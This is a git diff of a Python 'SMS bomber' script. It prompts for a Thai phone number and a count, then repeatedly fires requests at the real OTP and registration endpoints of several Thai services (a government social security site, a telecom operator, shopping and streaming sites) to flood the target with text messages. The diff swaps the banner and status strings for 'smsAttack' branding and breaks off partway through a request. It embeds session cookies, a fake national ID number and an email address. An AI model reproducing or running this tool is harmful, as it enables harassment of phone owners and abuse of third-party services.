@@ -1,33 +1,35 @@
 import requests
 import os
 os.system("clear")
-print("""░██████╗███╗░░░███╗░██████╗███████╗██████╗░███████╗
-██╔════╝████╗░████║██╔════╝██╔════╝██╔══██╗██╔════╝
-╚█████╗░██╔████╔██║╚█████╗░█████╗░░██████╔╝█████╗░░
-░╚═══██╗██║╚██╔╝██║░╚═══██╗██╔══╝░░██╔══██╗██╔══╝░░
-██████╔╝██║░╚═╝░██║██████╔╝██║░░░░░██║░░██║███████╗
-╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚══════╝""")
-print("\033[91mเครดิต ราชา แฮ็กเกอร์")
+print("""
+██████╗  █████╗ ██╗      █████╗ ██╗     ██╗ ██████╗ ██╗  ██╗████████╗
+██╔══██╗██╔══██╗██║     ██╔══██╗██║     ██║██╔════╝ ██║  ██║╚══██╔══╝
+██████╔╝███████║██║     ███████║██║     ██║██║  ███╗███████║   ██║   
+██╔═══╝ ██╔══██║██║     ██╔══██║██║     ██║██║   ██║██╔══██║   ██║   
+██║     ██║  ██║███████╗██║  ██║███████╗██║╚██████╔╝██║  ██║   ██║   
+╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
+                                                                     """)
+print("\033[DC:1999&palalight by. Lucifer.pl#1999")
 from requests import get
 from requests import Session
 from requests import post,Session
 from threading import Thread
 import colorama
-phone = input("ใส่เบอร์:")
-num = int(input("จำนวนsms:"))
+phone = input("Number:")
+num = int(input("จำนวน:"))
 for i in range(num):
     requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
-    print("\033[92mAPI1ทำงาน")
+    print("\033[[+]!smsAttack")
     requests.post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone})
-    print("\033[1;96mAPI2ทำงาน")
+    print("\033[1;[+]!smsAttack")
     requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
-    print("\033[91mAPI3ทำงาน")
+    print("\033[[+]!smsAttack")
     requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
-    print("\033[91mAPI4ทำงาน")
+    print("\033[[+]!smsAttack")
     requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone})
-    print("\033[91mAPI5ทำงาน")
+    print("\033[[+]!smsAttack")
     requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
-    print("\033[91mAPI6โจมตี")
+    print("\033[[+]!smsAttack")
     requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
 
         "language": "th"},headers={"accept": "application/json, text/plain, /",
